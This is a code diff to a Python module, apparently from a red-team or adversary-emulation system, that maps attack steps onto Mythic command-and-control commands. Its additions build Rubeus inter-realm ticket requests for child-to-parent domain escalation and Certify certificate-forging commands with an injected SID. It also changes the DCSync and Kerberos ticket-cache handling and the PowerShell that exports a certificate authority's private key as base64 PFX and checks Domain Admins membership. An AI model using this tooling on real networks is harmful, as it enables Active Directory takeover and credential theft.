@@ -139,6 +139,12 @@ def _translate_step(step: Any, config: dict[str, Any]) -> MythicCapabilityComman
         return _drsuapi_dcsync_command(step, config)
     if operation in {"kerberos-ticket-forge", "kerberos-golden-ticket"}:
         return _kerberos_ticket_forge_command(step, config)
+    if operation in {
+        "kerberos-inter-realm-referral",
+        "kerberos-service-ticket-request",
+        "kerberos-ticket-asktgs",
+    }:
+        return _kerberos_inter_realm_referral_command(step, config)
     if operation in {"kerberos-account-tgt", "kerberos-tgt-request"}:
         return _kerberos_account_tgt_command(step, config)
     if operation == "kerberos-logon-session-create":
@@ -291,12 +297,13 @@ def _drsuapi_dcsync_command(step: Any, config: dict[str, Any]) -> MythicCapabili
     if not domain:
         return MythicCapabilityCommandPlan(False, missing=["domain"], reason="DCSync adapter needs a domain")
 
-    executor = _normalize(config.get("executor"))
+    executor = _normalize(parameters.get("executor") or config.get("executor"))
     native_command = _adapter_text(config, "drsuapi_command", "dcsync")
     if native_command and executor != "mimikatz":
+        native_account = _dcsync_user_qualifier(account, domain) if executor == "native" else account
         mythic_parameters = {
             _adapter_text(config, "drsuapi_domain_param", "domain"): domain,
-            _adapter_text(config, "drsuapi_user_param", "user"): account,
+            _adapter_text(config, "drsuapi_user_param", "user"): native_account,
         }
         dc_param = _adapter_text(config, "drsuapi_dc_param", "dc")
         if dc:
@@ -409,6 +416,52 @@ def _managed_kerberos_ticket_forge_command(
         return command
     return MythicCapabilityCommandPlan(True, commands=[
         _command_with_artifacts(command.commands[0], produces=["kerberos_ticket_base64"]),
+    ])
+
+
+def _kerberos_inter_realm_referral_command(step: Any, config: dict[str, Any]) -> MythicCapabilityCommandPlan:
+    """Map a generic TGS exchange to the payload's managed Kerberos command.
+
+    Child-to-parent escalation invokes this twice: the child DC issues the parent referral, then the parent DC
+    exchanges that referral for the service ticket used by the proof operation. The latest ticket artifact
+    intentionally replaces the prior one for downstream import.
+    """
+    parameters = getattr(step, "parameters", {}) if isinstance(getattr(step, "parameters", {}), dict) else {}
+    target_domain = _text(
+        parameters.get("target_domain") or parameters.get("parent_domain") or parameters.get("service_domain")
+    )
+    dc = _text(parameters.get("dc") or parameters.get("child_dc") or parameters.get("domain_controller"))
+    ticket = _text(parameters.get("ticket_base64") or parameters.get("ticket") or "{{kerberos_ticket_base64}}")
+    service = _text(parameters.get("service")) or (f"krbtgt/{target_domain}" if target_domain else "")
+    missing = []
+    if not service:
+        missing.append("target_domain")
+    if not dc:
+        missing.append("dc")
+    if missing:
+        return MythicCapabilityCommandPlan(
+            False,
+            missing=missing,
+            reason="Kerberos TGS exchange needs a target service and domain controller",
+        )
+    pieces = ["asktgs", f"/ticket:{ticket}", f"/service:{service}", f"/dc:{dc}"]
+    if parameters.get("nowrap", True) is not False:
+        pieces.append("/nowrap")
+    tool_name = _adapter_text(config, "kerberos_tool", _adapter_text(config, "managed_kerberos_tool", "Rubeus.exe"))
+    if not tool_name:
+        return MythicCapabilityCommandPlan(
+            False, missing=["kerberos_tool"], reason="inter-realm referral needs a managed Kerberos tool"
+        )
+    command = _dotnet_tool_command(step, config, tool_name, " ".join(pieces))
+    if not command.ok:
+        return command
+    return MythicCapabilityCommandPlan(True, commands=[
+        _command_with_artifacts(
+            command.commands[0],
+            consumes=["kerberos_ticket_base64"],
+            produces=["kerberos_ticket_base64"],
+            deferred=True,
+        ),
     ])
 
 
@@ -678,7 +731,11 @@ def _kerberos_logon_session_create_command(step: Any, config: dict[str, Any]) ->
 
 def _kerberos_ticket_import_command(step: Any, config: dict[str, Any]) -> MythicCapabilityCommandPlan:
     parameters = getattr(step, "parameters", {}) if isinstance(getattr(step, "parameters", {}), dict) else {}
-    command = _adapter_text(config, "ticket_import_command", "ticket_store_add")
+    agent_cache = _uses_agent_kerberos_cache(parameters)
+    if agent_cache:
+        command = _adapter_text(config, "current_ticket_import_command", "ticket_cache_add")
+    else:
+        command = _adapter_text(config, "ticket_import_command", "ticket_store_add")
     if not command:
         return MythicCapabilityCommandPlan(False, missing=["ticket_import_command"], reason="no ticket import command")
 
@@ -694,7 +751,7 @@ def _kerberos_ticket_import_command(step: Any, config: dict[str, Any]) -> Mythic
         _adapter_text(config, "ticket_base64_param", "base64ticket"): ticket_value,
     }
     existing_ticket_param = _adapter_text(config, "ticket_existing_credential_param", "")
-    if existing_ticket_param:
+    if existing_ticket_param and not agent_cache:
         mythic_parameters[existing_ticket_param] = {
             "account": user,
             "realm": domain,
@@ -703,14 +760,17 @@ def _kerberos_ticket_import_command(step: Any, config: dict[str, Any]) -> Mythic
         }
     luid_param = _adapter_text(config, "ticket_luid_param", "luid")
     target_context = _text(parameters.get("target_context"))
-    if luid_param and target_context and not target_context.startswith("{{"):
+    if luid_param and target_context and not target_context.startswith("{{") and not agent_cache:
         mythic_parameters[luid_param] = target_context
     return MythicCapabilityCommandPlan(True, commands=[
         _command_from_step(
             step,
             command,
             mythic_parameters,
-            consumes=["kerberos_ticket_base64", "kerberos_logon_context"],
+            consumes=["kerberos_ticket_base64"] if agent_cache else [
+                "kerberos_ticket_base64",
+                "kerberos_logon_context",
+            ],
             produces=["kerberos_ticket_imported"],
             deferred="{{" in ticket_value,
         ),
@@ -721,6 +781,24 @@ def _kerberos_ticket_list_command(step: Any, config: dict[str, Any]) -> MythicCa
     parameters = getattr(step, "parameters", {}) if isinstance(getattr(step, "parameters", {}), dict) else {}
     target_context = _text(parameters.get("target_context"))
     current_context = _is_current_kerberos_context(target_context)
+    agent_cache = _uses_agent_kerberos_cache(parameters)
+    if current_context and agent_cache:
+        command = _adapter_text(config, "current_ticket_cache_list_command", "ticket_cache_list")
+        if not command:
+            return MythicCapabilityCommandPlan(
+                False,
+                missing=["current_ticket_cache_list_command"],
+                reason="no agent-cache ticket-list command",
+            )
+        return MythicCapabilityCommandPlan(True, commands=[
+            _command_from_step(
+                step,
+                command,
+                {"luid": "", "getSystemTickets": False},
+                consumes=["kerberos_ticket_imported"],
+                produces=["kerberos_context_inventory"],
+            ),
+        ])
     if current_context:
         command = _adapter_text(config, "current_ticket_list_command", "shell")
         if not command:
@@ -765,6 +843,24 @@ def _kerberos_ticket_purge_command(step: Any, config: dict[str, Any]) -> MythicC
     parameters = getattr(step, "parameters", {}) if isinstance(getattr(step, "parameters", {}), dict) else {}
     target_context = _text(parameters.get("target_context"))
     current_context = _is_current_kerberos_context(target_context)
+    agent_cache = _uses_agent_kerberos_cache(parameters)
+    if current_context and agent_cache:
+        command = _adapter_text(config, "current_ticket_cache_purge_command", "ticket_cache_purge")
+        if not command:
+            return MythicCapabilityCommandPlan(
+                False,
+                missing=["current_ticket_cache_purge_command"],
+                reason="no agent-cache ticket-purge command",
+            )
+        return MythicCapabilityCommandPlan(True, commands=[
+            _command_from_step(
+                step,
+                command,
+                {"all": True, "serviceName": "", "luid": ""},
+                consumes=[],
+                produces=["kerberos_current_tickets_purged"],
+            ),
+        ])
     if current_context:
         command = _adapter_text(config, "current_ticket_purge_command", "shell")
         if not command:
@@ -1701,6 +1797,12 @@ def _adcs_certificate_forge_command(step: Any, config: dict[str, Any]) -> Mythic
     )
     subject = _text(parameters.get("subject") or parameters.get("certificate_subject"))
     subject_alt_name = _text(parameters.get("subject_alt_name") or parameters.get("san") or parameters.get("upn"))
+    account_sid = _text(parameters.get("account_sid") or parameters.get("target_sid") or parameters.get("principal_sid"))
+    crl_distribution_points = _string_list(
+        parameters.get("crl_distribution_points")
+        or parameters.get("crl_distribution_point")
+        or parameters.get("crl")
+    )
     forged_pfx_path = _text(
         parameters.get("forged_pfx_path")
         or parameters.get("forged_certificate_path")
@@ -1731,15 +1833,35 @@ def _adcs_certificate_forge_command(step: Any, config: dict[str, Any]) -> Mythic
             reason="ADCS certificate forge adapter needs CA PFX, subject/SAN, and output PFX path/password",
         )
 
-    pieces = [
-        "--CaCertPath", _quote_cli(ca_pfx_path),
-        "--CaCertPassword", _quote_cli(ca_pfx_password),
-        "--Subject", _quote_cli(subject),
-        "--SubjectAltName", _quote_cli(subject_alt_name),
-        "--NewCertPath", _quote_cli(forged_pfx_path),
-        "--NewCertPassword", _quote_cli(forged_pfx_password),
-    ]
-    tool_name = _adapter_text(config, "certificate_forge_tool", _adapter_text(config, "adcs_certificate_forge_tool", "ForgeCert.exe"))
+    tool_name = _adapter_text(config, "certificate_forge_tool", _adapter_text(config, "adcs_certificate_forge_tool", "Certify.exe"))
+    backend = _normalize(config.get("certificate_forge_backend") or config.get("adcs_certificate_forge_backend"))
+    if not backend:
+        backend = "forgecert" if "forgecert" in _normalize(tool_name) else "certify"
+    if backend in {"forgecert", "forge-cert"}:
+        pieces = [
+            "--CaCertPath", _quote_cli(ca_pfx_path),
+            "--CaCertPassword", _quote_cli(ca_pfx_password),
+            "--Subject", _quote_cli(subject),
+            "--SubjectAltName", _quote_cli(subject_alt_name),
+            "--NewCertPath", _quote_cli(forged_pfx_path),
+            "--NewCertPassword", _quote_cli(forged_pfx_password),
+        ]
+    else:
+        pieces = [
+            "forge",
+            "--ca-cert", _quote_cli(ca_pfx_path),
+            "--ca-pass", _quote_cli(ca_pfx_password),
+            "--subject", _quote_cli(subject),
+            "--upn", _quote_cli(subject_alt_name),
+        ]
+        if account_sid:
+            pieces.extend(["--sid", _quote_cli(account_sid)])
+        if crl_distribution_points:
+            pieces.extend(["--crl", _quote_cli(crl_distribution_points[0])])
+        pieces.extend([
+            "--output-path", _quote_cli(forged_pfx_path),
+            "--output-pass", _quote_cli(forged_pfx_password),
+        ])
     command = _dotnet_tool_command(step, config, tool_name, " ".join(pieces))
     if not command.ok:
         return command
@@ -2393,12 +2515,15 @@ def _certificate_schannel_ldap_powershell(
             "try{"
             "Add-Type -AssemblyName System.DirectoryServices.Protocols;"
             "Add-Type -AssemblyName System.Security;"
-            "$flags=[System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::MachineKeySet -bor "
-            "[System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::PersistKeySet;"
+            "$flags=[System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::Exportable;"
             "$cert=New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($certPath,$certPassword,$flags);"
             "$clientCert=$cert;"
             "$conn=$null;"
+            "$searchResponse=$null;"
             "$lastErr=$null;"
+            "$toText={param($value) if($value -is [byte[]]){[Text.Encoding]::UTF8.GetString($value)}else{[string]$value}};"
+            "$attrs=[string[]]@('distinguishedName','memberOf','primaryGroupID','sAMAccountName');"
+            "$scope=[System.DirectoryServices.Protocols.SearchScope]::Subtree;"
             "$attempts=@("
             "(New-Object psobject -Property @{Mode='ldaps';Port=636;Ssl=$true}),"
             "(New-Object psobject -Property @{Mode='starttls';Port=389;Ssl=$false})"
@@ -2414,7 +2539,8 @@ def _certificate_schannel_ldap_powershell(
             "$candidate.SessionOptions.QueryClientCertificate={param($connection,$trustedCAs) $clientCert};"
             "$null=$candidate.ClientCertificates.Add($cert);"
             "if($attempt.Mode -eq 'starttls'){$candidate.SessionOptions.StartTransportLayerSecurity($null)};"
-            "$candidate.Bind();"
+            "$probeRequest=New-Object System.DirectoryServices.Protocols.SearchRequest($base,$filter,$scope,$attrs);"
+            "$searchResponse=$candidate.SendRequest($probeRequest);"
             "$conn=$candidate;"
             "$lines.Add(('CERT_AUTH_TRANSPORT='+$attempt.Mode));"
             "$lines.Add(('CERT_AUTH_PORT='+[string]$attempt.Port));"
@@ -2439,10 +2565,10 @@ def _certificate_schannel_ldap_powershell(
             "return"
             "};"
             "$lines.Add('CERT_AUTH_LDAP_BIND=True');"
-            "$attrs=[string[]]@('distinguishedName','memberOf','primaryGroupID','sAMAccountName');"
-            "$scope=[System.DirectoryServices.Protocols.SearchScope]::Subtree;"
-            "$req=New-Object System.DirectoryServices.Protocols.SearchRequest($base,$filter,$scope,$attrs);"
-            "$res=$conn.SendRequest($req);"
+            "$whoRequest=New-Object System.DirectoryServices.Protocols.ExtendedRequest('1.3.6.1.4.1.4203.1.11.3');"
+            "$whoResponse=$conn.SendRequest($whoRequest);"
+            "if($whoResponse.ResponseValue){$lines.Add(('CERT_AUTH_WHOAMI='+[Text.Encoding]::UTF8.GetString($whoResponse.ResponseValue)))};"
+            "$res=$searchResponse;"
             "if($res.Entries.Count -lt 1){"
             "$lines.Add('CERT_AUTH_STATUS=FAILED');"
             "$lines.Add('CERT_AUTH_ERROR=target account not found')"
@@ -2452,13 +2578,13 @@ def _certificate_schannel_ldap_powershell(
             "$isDa=$false;"
             "if($entry.Attributes['memberOf']){"
             "foreach($group in $entry.Attributes['memberOf']){"
-            "$g=[string]$group;"
+            "$g=& $toText $group;"
             "$lines.Add(('CERT_AUTH_MEMBER_OF='+$g));"
             "if($g -match '(?i)^CN=Domain Admins,'){$isDa=$true}"
             "}"
             "};"
             "if($entry.Attributes['primaryGroupID'] -and $entry.Attributes['primaryGroupID'].Count -gt 0){"
-            "$pg=[string]$entry.Attributes['primaryGroupID'][0];"
+            "$pg=& $toText $entry.Attributes['primaryGroupID'][0];"
             "$lines.Add(('CERT_AUTH_PRIMARY_GROUP_ID='+$pg));"
             "if($pg -eq '512'){$isDa=$true}"
             "};"
@@ -2663,9 +2789,10 @@ def _adcs_ca_certutil_backup_remote_powershell(
             "if(-not $pfx){$lines+=@('CA_EXPORT_STATUS=FAILED','CA_EXPORT_ERROR=certutil backup did not produce a PFX/P12 file');"
             "Set-Content -LiteralPath $metaPath -Value $lines -Encoding ASCII;exit 3};"
             "$bytes=[IO.File]::ReadAllBytes($pfx.FullName);"
+            "$exportedCert=New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($pfx.FullName,$pfxSecret);"
             "$sha=[BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash($bytes)).Replace('-','').ToLowerInvariant();"
-            "$lines+=@('CA_EXPORT_STATUS=OK',('CA_SUBJECT='+$cert.Subject),('CA_ISSUER='+$cert.Issuer),"
-            "('CA_THUMBPRINT='+$cert.Thumbprint),('CA_PFX_PATH='+$pfx.FullName),('PFX_SHA256='+$sha),"
+            "$lines+=@('CA_EXPORT_STATUS=OK',('CA_SUBJECT='+$exportedCert.Subject),('CA_ISSUER='+$exportedCert.Issuer),"
+            "('CA_THUMBPRINT='+$exportedCert.Thumbprint),('CA_PFX_PATH='+$pfx.FullName),('PFX_SHA256='+$sha),"
             "('PFX_BASE64='+[Convert]::ToBase64String($bytes)));"
             "Set-Content -LiteralPath $metaPath -Value $lines -Encoding ASCII;"
             "}catch{"
@@ -2697,9 +2824,10 @@ def _adcs_ca_export_remote_powershell(
         "if(-not $cert){$lines+=@('CA_EXPORT_STATUS=NO_CA_CERTIFICATE');Set-Content -LiteralPath $metaPath -Value $lines -Encoding ASCII;exit 2}",
         "$pwd=ConvertTo-SecureString $pfxSecret -AsPlainText -Force",
         "Export-PfxCertificate -Cert $cert -FilePath $pfxPath -Password $pwd -Force | Out-Null",
+        "$exportedCert=New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($pfxPath,$pfxSecret)",
         "$bytes=[IO.File]::ReadAllBytes($pfxPath)",
         "$sha=[BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash($bytes)).Replace('-','').ToLowerInvariant()",
-        "$lines+=@('CA_EXPORT_STATUS=OK',('CA_SUBJECT='+$cert.Subject),('CA_ISSUER='+$cert.Issuer),('CA_THUMBPRINT='+$cert.Thumbprint),('CA_PFX_PATH='+$pfxPath),('PFX_SHA256='+$sha),('PFX_BASE64='+[Convert]::ToBase64String($bytes)))",
+        "$lines+=@('CA_EXPORT_STATUS=OK',('CA_SUBJECT='+$exportedCert.Subject),('CA_ISSUER='+$exportedCert.Issuer),('CA_THUMBPRINT='+$exportedCert.Thumbprint),('CA_PFX_PATH='+$pfxPath),('PFX_SHA256='+$sha),('PFX_BASE64='+[Convert]::ToBase64String($bytes)))",
         "Set-Content -LiteralPath $metaPath -Value $lines -Encoding ASCII",
         "}catch{",
         "$msg=$_.Exception.Message -replace \"`r|`n\",' '",
@@ -2809,6 +2937,15 @@ def _domain_dn(domain: str) -> str:
 def _is_current_kerberos_context(value: Any) -> bool:
     normalized = _normalize(value)
     return normalized in {"", "current", "default", "existing", "current-context", "current_kerberos_context"}
+
+
+def _uses_agent_kerberos_cache(parameters: dict[str, Any]) -> bool:
+    return _normalize(parameters.get("store")) in {
+        "agent-cache",
+        "current-cache",
+        "current-luid",
+        "ticket-cache",
+    }
 
 
 def _command_from_step(
